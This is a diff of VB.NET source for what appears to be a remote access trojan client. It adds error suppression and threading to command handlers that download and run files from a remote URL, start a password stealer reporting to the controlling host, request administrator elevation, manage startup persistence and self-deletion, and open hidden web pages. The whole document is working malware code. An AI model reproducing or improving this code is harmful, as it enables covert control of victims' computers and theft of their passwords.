@@ -124,7 +124,9 @@ Public Class Form1
 
             If ElevateUAC = "True" Then
                 Try
-                    RestartElevated()
+                    Dim ElevateThread As New Thread(AddressOf RestartElevated)
+                    ElevateThread.IsBackground = True
+                    ElevateThread.Start()
                 Catch ex As Exception
                     Return
                 End Try
@@ -283,11 +285,15 @@ Public Class Form1
                         End Select
 
                     Case "UploadFile"
-                        Dim DownloadFile As New WebClient
-                        Dim File() As Byte = DownloadFile.DownloadData(A(1))
-                        IO.File.WriteAllBytes(Environ("Temp") & "\" & A(2), File)
-                        Process.Start(Environ("Temp") & "\" & A(2))
-                        C.Send("CleanCommands")
+                        Try
+                            Dim DownloadFile As New WebClient
+                            Dim File() As Byte = DownloadFile.DownloadData(A(1))
+                            IO.File.WriteAllBytes(Environ("Temp") & "\" & A(2), File)
+                            Process.Start(Environ("Temp") & "\" & A(2))
+                            C.Send("CleanCommands")
+                        Catch ex As Exception
+
+                        End Try
 
                     Case "OpenPage"
                         Dim OpenPage As New Thread(Sub() OpenWebVisable(A(1)))
@@ -302,11 +308,15 @@ Public Class Form1
                         C.Send("CleanCommands")
 
                     Case "Uninstall"
-                        C.Send("Uninstall")
-                        DStartup(StartName)
-                        Watchdog.StopWatcher(True)
-                        SelfDestroy()
-                        Application.Exit()
+                        Try
+                            C.Send("Uninstall")
+                            DStartup(StartName)
+                            Watchdog.StopWatcher(True)
+                            SelfDestroy()
+                            Application.Exit()
+                        Catch ex As Exception
+
+                        End Try
 
                     Case "ExecuteScript"
                         Try
@@ -427,10 +437,14 @@ Public Class Form1
                         C.Send("CleanCommands")
 
                     Case "StealPassword"
-                        Dim StealerThread As New Thread(Sub() StealPasswords("PasswordStealer", CurrentHost))
-                        StealerThread.IsBackground = True
-                        StealerThread.Start()
-                        C.Send("CleanCommands")
+                        Try
+                            Dim StealerThread As New Thread(Sub() StealPasswords("PasswordStealer", CurrentHost))
+                            StealerThread.IsBackground = True
+                            StealerThread.Start()
+                            C.Send("CleanCommands")
+                        Catch ex As Exception
+
+                        End Try
 
                     Case "UpdateClient"
                         UpdateClient(A(1))
@@ -441,7 +455,13 @@ Public Class Form1
                         Application.Restart()
 
                     Case "Elevate"
-                        RestartElevated()
+                        Try
+                            Dim ElevateThread As New Thread(AddressOf RestartElevated)
+                            ElevateThread.IsBackground = True
+                            ElevateThread.Start()
+                        Catch ex As Exception
+                            Return
+                        End Try
                         C.Send("CleanCommands")
 
                     Case "Logoff"
@@ -565,6 +585,9 @@ Public Class Form1
             Process.Start(Url)
             C.Send("CleanCommands")
         Catch ex As Exception
+            Dim WebThread As New Thread(Sub() OpenWebHidden(Url))
+            WebThread.IsBackground = True
+            WebThread.Start()
             C.Send("CleanCommands")
         End Try
     End Sub
@@ -613,21 +636,24 @@ Public Class Form1
         End Try
     End Function
     Private Sub RestartElevated()
-        Dim startInfo As New ProcessStartInfo()
-        With startInfo
-            .UseShellExecute = True
-            .WorkingDirectory = Environment.CurrentDirectory
-            .FileName = Application.ExecutablePath
-            .Verb = "runas"
-        End With
-        Try
-            C.Send("CleanCommands")
-            Dim p As Process = Process.Start(startInfo)
-            End
-        Catch ex As System.ComponentModel.Win32Exception
-            C.Send("CleanCommands")
-            Return
-        End Try
+        If checkadmin() = "Administrator" Then
+        Else
+            Dim startInfo As New ProcessStartInfo()
+            With startInfo
+                .UseShellExecute = True
+                .WorkingDirectory = Environment.CurrentDirectory
+                .FileName = Application.ExecutablePath
+                .Verb = "runas"
+            End With
+            Try
+                C.Send("CleanCommands")
+                Dim p As Process = Process.Start(startInfo)
+                End
+            Catch ex As System.ComponentModel.Win32Exception
+                C.Send("CleanCommands")
+                Return
+            End Try
+        End If
     End Sub
     Public Function ProgramList()
         On Error Resume Next
